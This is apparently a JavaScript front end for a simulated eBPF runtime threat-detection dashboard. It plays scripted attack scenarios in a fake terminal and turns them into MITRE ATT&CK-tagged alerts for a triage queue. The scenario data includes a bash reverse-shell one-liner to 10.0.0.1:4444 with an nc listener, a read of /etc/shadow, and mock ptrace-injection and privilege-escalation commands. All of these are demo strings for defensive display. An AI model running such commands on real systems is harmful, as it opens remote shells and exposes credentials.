/**
 * SENTINEL-eBPF // Linux Runtime Kernel Threat Detection Workstation
 * Industrial Tactical Console Engine
 */

let sysCount = 0;
let alertCount = 0;
let incidentQueue = [];
let activeFilter = 'ALL';

const EXPLOIT_DEFINITIONS = {
  reverse_shell: {
    name: 'Interactive Reverse Shell',
    ruleId: 'RULE-EDR-001',
    severity: 'CRITICAL',
    sevBadgeClass: 'bg-crimson/20 text-crimson border-crimson/40',
    borderClass: 'border-crimson/50 hover:border-crimson',
    mitre: {
      techniqueId: 'T1059.004',
      techniqueName: 'Unix Shell',
      tacticName: 'Execution (TA0002)',
      url: 'https://attack.mitre.org/techniques/T1059/004/'
    },
    commands: [
      { text: 'adversary@victim-host:~$ nc -lvnp 4444 &', delay: 80 },
      { text: 'adversary@victim-host:~$ /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', delay: 280, isAdversary: true },
      { text: '[+] Outbound TCP socket established: 10.0.0.5:43922 -> 10.0.0.1:4444', delay: 480 }
    ],
    syscall: 'sys_enter_execve + sys_enter_connect',
    bpfStruct: {
      timestamp_ns: 1700000000123456789,
      timestamp_iso: new Date().toISOString(),
      event_type: 'EXECVE',
      pid: 1337,
      tgid: 1337,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'bash',
      filename: '/bin/bash',
      args: '-i >& /dev/tcp/10.0.0.1/4444 0>&1',
      cmdline: '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      outbound_ip: '10.0.0.1',
      outbound_port: 4444,
      retval: 0
    },
    lineage: 'systemd(1) -> sshd(842) -> bash(1000) -> bash(1337)',
    description: 'Intercepted interactive shell process redirection to network socket via /dev/tcp pseudo-device.'
  },

  process_injection: {
    name: 'PTRACE Memory Injection',
    ruleId: 'RULE-EDR-002',
    severity: 'CRITICAL',
    sevBadgeClass: 'bg-crimson/20 text-crimson border-crimson/40',
    borderClass: 'border-crimson/50 hover:border-crimson',
    mitre: {
      techniqueId: 'T1055.008',
      techniqueName: 'Ptrace System Calls',
      tacticName: 'Defense Evasion (TA0005)',
      url: 'https://attack.mitre.org/techniques/T1055/008/'
    },
    commands: [
      { text: 'adversary@victim-host:~$ ./mem_injector --target 1 --addr 0x400000', delay: 80 },
      { text: '[*] [PID: 2048] Invoking ptrace(PTRACE_ATTACH, target_pid=1, ...)', delay: 280, isAdversary: true },
      { text: '[+] Target attached. Invoking ptrace(PTRACE_POKETEXT, addr=0x00400000, data=0x90909090)', delay: 480, isAdversary: true },
      { text: '[+] Arbitrary bytecode written to foreign process memory.', delay: 650 }
    ],
    syscall: 'sys_enter_ptrace',
    bpfStruct: {
      timestamp_ns: 1700000001000000000,
      timestamp_iso: new Date().toISOString(),
      event_type: 'PTRACE',
      pid: 2048,
      tgid: 2048,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'mem_injector',
      ptrace_request: 'PTRACE_POKETEXT',
      ptrace_request_code: 4,
      target_pid: 1,
      addr: '0x0000000000400000',
      data: '0x0000000090909090'
    },
    lineage: 'systemd(1) -> bash(1000) -> mem_injector(2048)',
    description: 'Intercepted unauthorized PTRACE_POKETEXT call attempting code injection into target process.'
  },

  privilege_escalation: {
    name: 'Root Privilege Escalation',
    ruleId: 'RULE-EDR-003',
    severity: 'HIGH',
    sevBadgeClass: 'bg-amber-500/20 text-amber-400 border-amber-500/40',
    borderClass: 'border-amber-500/50 hover:border-amber-500',
    mitre: {
      techniqueId: 'T1068',
      techniqueName: 'Exploitation for PrivEsc',
      tacticName: 'Privilege Escalation (TA0004)',
      url: 'https://attack.mitre.org/techniques/T1068/'
    },
    commands: [
      { text: 'adversary@victim-host:~$ ./cve_privesc_exploit', delay: 80 },
      { text: '[*] Overwriting kernel credentials table for current task...', delay: 280, isAdversary: true },
      { text: '[+] UID transition verified: 1000 -> 0 (root)', delay: 450, isAdversary: true },
      { text: 'adversary@victim-host:~# /bin/sh', delay: 600, isAdversary: true }
    ],
    syscall: 'sys_enter_execve',
    bpfStruct: {
      timestamp_ns: 1700000002000000000,
      timestamp_iso: new Date().toISOString(),
      event_type: 'EXECVE',
      pid: 31337,
      tgid: 31337,
      ppid: 1005,
      uid: 0,
      gid: 0,
      comm: 'sh',
      filename: '/bin/sh',
      args: '',
      cmdline: '/bin/sh',
      retval: 0
    },
    lineage: 'systemd(1) -> unprivileged_parent(1005) -> sh(31337)[UID=0]',
    description: 'Detected unexpected shell execution with root privileges (UID 0) spawned by non-init user process.'
  },

  sensitive_file: {
    name: 'Sensitive Credential Read',
    ruleId: 'RULE-EDR-004',
    severity: 'HIGH',
    sevBadgeClass: 'bg-amber-500/20 text-amber-400 border-amber-500/40',
    borderClass: 'border-amber-500/50 hover:border-amber-500',
    mitre: {
      techniqueId: 'T1003.008',
      techniqueName: '/etc/passwd and /etc/shadow',
      tacticName: 'Credential Access (TA0006)',
      url: 'https://attack.mitre.org/techniques/T1003/008/'
    },
    commands: [
      { text: 'adversary@victim-host:~$ cat /etc/shadow', delay: 80, isAdversary: true },
      { text: 'root:$6$rounds=4096$vF8u...:19200:0:99999:7:::', delay: 280 },
      { text: 'daemon:*:19200:0:99999:7:::', delay: 400 }
    ],
    syscall: 'sys_enter_openat',
    bpfStruct: {
      timestamp_ns: 1700000003000000000,
      timestamp_iso: new Date().toISOString(),
      event_type: 'OPENAT',
      pid: 4096,
      tgid: 4096,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'cat',
      filepath: '/etc/shadow',
      file_path: '/etc/shadow',
      flags: 0,
      flags_desc: 'O_RDONLY',
      dfd: -100,
      retval: 0
    },
    lineage: 'systemd(1) -> bash(1000) -> cat(4096)',
    description: 'Intercepted unauthorized openat file descriptor read targeting /etc/shadow credential database.'
  },

  benign: {
    name: 'Benign Control Activity',
    ruleId: null,
    severity: 'BENIGN',
    commands: [
      { text: 'adversary@victim-host:~$ whoami && uname -a && ls -la /tmp', delay: 80 },
      { text: 'uid=1000(user) gid=1000(user)', delay: 200 },
      { text: 'Linux linux-node-01 6.8.0-generic #28-Ubuntu SMP x86_64', delay: 350 },
      { text: 'total 0\ndrwxrwxrwt  2 root root  40 Sep  8 18:00 .', delay: 500 }
    ],
    syscall: 'sys_enter_execve',
    bpfStruct: {
      timestamp_ns: 1700000004000000000,
      timestamp_iso: new Date().toISOString(),
      event_type: 'EXECVE',
      pid: 5120,
      tgid: 5120,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'uname',
      filename: '/bin/uname',
      args: '-a',
      cmdline: '/bin/uname -a',
      retval: 0
    },
    lineage: 'systemd(1) -> bash(1000) -> uname(5120)',
    description: 'Normal user activity. Verified against 4 detection rules: 0 matches (no false positives).'
  }
};

/**
 * Dispatch an exploit execution
 */
function triggerExploit(key) {
  const item = EXPLOIT_DEFINITIONS[key];
  if (!item) return;

  const term = document.getElementById('host-terminal');
  const badge = document.getElementById('scope-syscall-badge');
  const rawJson = document.getElementById('scope-raw-json');
  const ticker = document.getElementById('bottom-ticker');

  // 1. Terminal Typing
  item.commands.forEach(cmd => {
    setTimeout(() => {
      const line = document.createElement('div');
      if (cmd.isAdversary) {
        line.className = 'text-rose-400 font-bold';
      } else {
        line.className = 'text-amber-200/90';
      }
      line.textContent = cmd.text;
      term.appendChild(line);
      term.scrollTop = term.scrollHeight;
    }, cmd.delay);
  });

  // 2. eBPF Kernel Interception Animation
  setTimeout(() => {
    sysCount += 1;
    document.getElementById('metric-sys-count').textContent = sysCount;

    badge.textContent = `INTERCEPTED: ${item.syscall}`;
    badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/50 font-bold';

    item.bpfStruct.timestamp_iso = new Date().toISOString();
    rawJson.textContent = JSON.stringify(item.bpfStruct, null, 2);

    ticker.textContent = `[${new Date().toLocaleTimeString()}] ${item.syscall} | comm='${item.bpfStruct.comm}' pid=${item.bpfStruct.pid} uid=${item.bpfStruct.uid}`;

    // If malicious, register incident in Triage Queue
    if (item.ruleId) {
      registerIncident(item);
    } else {
      setTimeout(() => {
        ticker.textContent = `[BENIGN BASELINE] Evaluated 4 rules -> 0 alerts generated (Pass)`;
      }, 500);
    }

    setTimeout(() => {
      badge.textContent = 'PROBE LISTENING';
      badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-tactical-800 text-slate-400 border border-tactical-border';
    }, 1400);

  }, 500);
}

/**
 * Register a detected security incident
 */
function registerIncident(item) {
  alertCount += 1;
  document.getElementById('metric-alert-count').textContent = alertCount;
  document.getElementById('triage-badge').textContent = alertCount;

  const empty = document.getElementById('triage-empty');
  if (empty) empty.style.display = 'none';

  const incident = {
    id: `INC-${Date.now().toString().slice(-4)}`,
    title: item.name,
    ruleId: item.ruleId,
    severity: item.severity,
    sevBadgeClass: item.sevBadgeClass,
    borderClass: item.borderClass,
    mitre: item.mitre,
    description: item.description,
    lineage: item.lineage,
    event: item.bpfStruct,
    timestamp: new Date().toLocaleTimeString()
  };

  incidentQueue.unshift(incident);
  renderIncidentQueue();
}

/**
 * Render incidents based on active filter
 */
function renderIncidentQueue() {
  const container = document.getElementById('incident-feed');
  const filtered = incidentQueue.filter(inc => {
    if (activeFilter === 'ALL') return true;
    return inc.severity === activeFilter;
  });

  const cards = container.querySelectorAll('.tactical-card');
  cards.forEach(c => c.remove());

  const empty = document.getElementById('triage-empty');
  if (filtered.length === 0) {
    if (empty) empty.style.display = 'flex';
    return;
  }
  if (empty) empty.style.display = 'none';

  filtered.forEach((inc, idx) => {
    const isNew = idx === 0 ? 'tactical-new-incident' : '';
    const card = document.createElement('div');
    card.className = `tactical-card p-3.5 rounded-lg bg-tactical-850 border ${inc.borderClass} ${isNew} transition-all duration-200 shadow-sm space-y-2.5`;

    let payloadDetail = '';
    if (inc.event.event_type === 'EXECVE') {
      payloadDetail = `<div class="truncate"><span class="text-tactical-muted">cmdline:</span> <span class="text-slate-200">${escapeHtml(inc.event.cmdline)}</span></div>`;
    } else if (inc.event.event_type === 'PTRACE') {
      payloadDetail = `<div><span class="text-tactical-muted">req:</span> <span class="text-crimson font-bold">${inc.event.ptrace_request}</span> &bull; <span class="text-tactical-muted">target:</span> PID ${inc.event.target_pid}</div>`;
    } else if (inc.event.event_type === 'OPENAT') {
      payloadDetail = `<div class="truncate"><span class="text-tactical-muted">file:</span> <span class="text-amber-300 font-bold">${inc.event.file_path}</span></div>`;
    }

    card.innerHTML = `
      <div class="flex items-center justify-between">
        <div class="flex items-center space-x-2">
          <span class="text-[10px] font-mono font-bold px-1.5 py-0.5 rounded border ${inc.sevBadgeClass}">${inc.severity}</span>
          <span class="text-xs font-mono font-bold text-slate-300">${inc.ruleId}</span>
        </div>
        <span class="text-[10px] font-mono text-tactical-muted">${inc.timestamp}</span>
      </div>

      <div>
        <h4 class="font-display font-bold text-xs text-white uppercase tracking-tight">${escapeHtml(inc.title)}</h4>
        <p class="text-[11px] text-tactical-muted mt-0.5 leading-snug">${escapeHtml(inc.description)}</p>
      </div>

      <!-- Process Lineage Box -->
      <div class="p-2 rounded bg-tactical-950 border border-tactical-border/70 font-mono text-[10px] space-y-1">
        <div class="flex items-center justify-between text-tactical-muted">
          <span>comm: <strong class="text-amber-400">${inc.event.comm}</strong> (pid: ${inc.event.pid})</span>
          <span>uid: <strong class="${inc.event.uid === 0 ? 'text-crimson' : 'text-slate-300'}">${inc.event.uid}</strong></span>
        </div>
        ${payloadDetail}
        <div class="text-tactical-muted truncate text-[9px] pt-1 border-t border-tactical-border/50">
          LINEAGE: <span class="text-slate-400">${inc.lineage}</span>
        </div>
      </div>

      <!-- MITRE ATT&CK Footer Tag -->
      <div class="pt-1.5 border-t border-tactical-border/60 flex items-center justify-between text-[10px] font-mono">
        <div class="flex items-center space-x-1.5 truncate">
          <span class="text-tactical-muted">${inc.mitre.techniqueId}</span>
          <span class="text-tactical-muted">&bull;</span>
          <span class="text-slate-300 truncate">${inc.mitre.techniqueName}</span>
        </div>
        <a href="${inc.mitre.url}" target="_blank" rel="noopener" class="text-amber-400 hover:text-amber-300 shrink-0 ml-2">
          MITRE &rarr;
        </a>
      </div>
    `;

    container.appendChild(card);
  });

  if (window.lucide) {
    lucide.createIcons();
  }
}

/**
 * Filter triage feed
 */
function filterQueue(sev) {
  activeFilter = sev;
  document.querySelectorAll('.triage-filter-btn').forEach(btn => {
    if (btn.textContent === sev) {
      btn.className = 'triage-filter-btn px-2 py-1 rounded bg-tactical-750 text-white font-bold';
    } else {
      btn.className = 'triage-filter-btn px-2 py-1 rounded bg-tactical-850 text-tactical-muted hover:text-white';
    }
  });
  renderIncidentQueue();
}

/**
 * Clear queue
 */
function clearIncidentLog() {
  incidentQueue = [];
  alertCount = 0;
  document.getElementById('metric-alert-count').textContent = 0;
  document.getElementById('triage-badge').textContent = 0;
  
  const term = document.getElementById('host-terminal');
  term.innerHTML = '<div class="text-tactical-muted">/* Incident log cleared. Workstation listening on eBPF probes... */</div>';
  
  const rawJson = document.getElementById('scope-raw-json');
  rawJson.textContent = '{\n  "status": "AWAITING_EVENTS",\n  "probes": 4\n}';
  
  renderIncidentQueue();
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) {
    lucide.createIcons();
  }
});
